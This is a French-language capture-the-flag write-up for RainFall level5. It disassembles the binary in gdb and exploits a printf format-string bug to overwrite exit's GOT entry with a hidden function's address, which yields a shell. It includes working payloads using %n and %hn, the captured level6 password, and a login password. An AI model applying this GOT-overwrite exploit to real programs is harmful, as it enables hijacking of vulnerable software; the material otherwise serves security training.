# LEVEL 5

On se connecte sur le level5, ou se trouve un **binaire** `level5`.

On cherche a savoir ce que fait ce binaire:
```gdb
> gdb level5 -q
Reading symbols from /home/user/level5/level5...(no debugging symbols found)...done.
(gdb) > disas main
Dump of assembler code for function main:
   0x08048504 <+0>:     push   %ebp
   0x08048505 <+1>:     mov    %esp,%ebp
   0x08048507 <+3>:     and    $0xfffffff0,%esp
   0x0804850a <+6>:     call   0x80484c2 <n>
   0x0804850f <+11>:    leave
   0x08048510 <+12>:    ret
End of assembler dump.
(gdb) > disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```
En regardant les fonctions utlisées, on trouve :

```gdb
(gdb) i functions
All defined functions:

Non-debugging symbols:
0x08048334  _init
0x08048380  printf
0x08048380  printf@plt
0x08048390  _exit
0x08048390  _exit@plt
0x080483a0  fgets
0x080483a0  fgets@plt
0x080483b0  system
0x080483b0  system@plt
0x080483c0  __gmon_start__
0x080483c0  __gmon_start__@plt
0x080483d0  exit
0x080483d0  exit@plt
0x080483e0  __libc_start_main
0x080483e0  __libc_start_main@plt
0x080483f0  _start
0x08048420  __do_global_dtors_aux
0x08048480  frame_dummy
0x080484a4  o
0x080484c2  n
0x08048504  main
0x08048520  __libc_csu_init
0x08048590  __libc_csu_fini
0x08048592  __i686.get_pc_thunk.bx
0x080485a0  __do_global_ctors_aux
0x080485cc  _fini
```
On trouve une fonction **o** non-utilisé dont l'adresse est **0x080484a4**, en little indian **\xa4\x84\x04\x08**:

```gdb
(gdb) > disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   0x080484a7 <+3>:     sub    $0x18,%esp
   0x080484aa <+6>:     movl   $0x80485f0,(%esp)
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    movl   $0x1,(%esp)
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

On trouve également une fonction **n** appelé par le main:

```gdb
(gdb) > disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
```

On va donc chercher à overflow sur le printf dans **n** pour pouvoir arriver sur **o** qui lancera un `/bin/sh`.

On cherche l'**offset** :
```bash
python -c 'print "BBBB" + "|%08x" * 4' | ./level5
BBBB|00000200|b7fd1ac0|b7ff37d0|42424242
```
> Offset = 4

On cherche ensuite l'adresse d' **exit** dans la GOT(Global Offset Table):

```gdb
(gdb) > (gdb) disas 0x80483d0
Dump of assembler code for function exit@plt:
   0x080483d0 <+0>:     jmp    *0x8049838
   0x080483d6 <+6>:     push   $0x28
   0x080483db <+11>:    jmp    0x8048370
End of assembler dump.
```
> exit 0x8049838

On vérifie qu'on arrive à modifier l'adresse du exit:

```gdb
level5@RainFall:~$ > gdb ./level5
(gdb)
(gdb) > disas n
Dump of assembler code for function n:
   0x080484c2 <+0>:     push   %ebp
   0x080484c3 <+1>:     mov    %esp,%ebp
   0x080484c5 <+3>:     sub    $0x218,%esp
   0x080484cb <+9>:     mov    0x8049848,%eax
   0x080484d0 <+14>:    mov    %eax,0x8(%esp)
   0x080484d4 <+18>:    movl   $0x200,0x4(%esp)
   0x080484dc <+26>:    lea    -0x208(%ebp),%eax
   0x080484e2 <+32>:    mov    %eax,(%esp)
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    -0x208(%ebp),%eax
   0x080484f0 <+46>:    mov    %eax,(%esp)
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    movl   $0x1,(%esp)
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) b *n+49
Breakpoint 1 at 0x80484f3
(gdb) b *n+54
Breakpoint 2 at 0x80484f8

(gdb) run <<< $(python -c 'print "\x38\x98\x04\x08" + "AAAA" + "%4$n"')
Starting program: /home/user/level5/level5 <<< $(python -c 'print "\x38\x98\x04\x08" + "AAAA" + "%4$n"')

Breakpoint 1, 0x080484f3 in n ()
(gdb) x/x 0x8049838
0x8049838 <exit@got.plt>:       0x080483d6
(gdb) c
Continuing.
8♦

Breakpoint 2, 0x080484f8 in n ()
(gdb) x/x 0x8049838
0x8049838 <exit@got.plt>:       0x00000004
```

On a mis un breakpoint avant notre printf et après et nous avons comparé l'adresse pointé par exit avant et après. On a bien réussi à écrire 4 (qui correspont à la taille de champ de notre addresse) sur l'addrese pointé par la GOT qui est sensé appelé notre exit.

On utilise l'argument `%n` pour charger la variable pointé par notre argument et lui insérer une valeur égale au nombres de caractères précédent l'argument `%n`.
On utilise le `4$` pour indiquer à notre `%n` de charger la 4 ème variable de **printf**, qui correspond à l'adresse du exit.

On cherche donc à modifier la valeur de l'adresse pour qu'elle pointe sur notre fonction **o**.
L'adresse de **exit** et l'adresse de **o** ayant en commun la moitié de leurs adresse (0x0804...), il nous suffi d'insérer la moitier droite de l'adresse de **o** en taille de champ avant notre argument:

`84a4 - 4 = 33952`

```bash
(python -c 'print "\x38\x98\x04\x08" + "%33952d" + "%4$hn"';cat) | ./level5
> whoami
level6
> cd ../level6 && cat .pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

On utilise l'option **h** pour notre argument **n** pour réécrire sur les 4 dernier bytes de l'adresse et concerver les 4 premier qui sont déjà les bons.

For download :
`scp -P4242 level5@IP:level5 .`
> Password : 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
